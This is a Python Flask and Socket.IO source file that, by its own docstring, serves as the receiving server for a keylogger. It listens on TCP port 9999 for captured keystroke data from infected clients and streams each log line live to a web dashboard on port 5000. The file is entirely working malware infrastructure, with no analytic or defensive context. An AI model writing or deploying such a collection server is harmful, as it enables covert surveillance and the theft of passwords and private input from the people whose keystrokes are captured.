from flask import Flask, render_template
from flask_socketio import SocketIO
import socket
import threading

app = Flask(__name__)
socketio = SocketIO(app)

@app.route('/')
def index():
    return render_template('index.html')

def tcp_listener():
    """Handles incoming keylogger TCP data and emits it to web clients."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))  # Listening on port 9999 for TCP data
    server_socket.listen(1)
    print("[*] Monitoring server listening on port 9999...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr}")

        def handle_client(client_socket):
            with client_socket:
                try:
                    while True:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        message = data.decode('utf-8').strip()
                        print("[Log] ", message)
                        socketio.emit('new_log', {'data': message})  # Emit the log to connected clients
                except (ConnectionResetError, BrokenPipeError):
                    print("[!] Client disconnected unexpectedly.")
            
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

# Start TCP socket listener thread
threading.Thread(target=tcp_listener, daemon=True).start()

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)  # WebSocket on port 5000
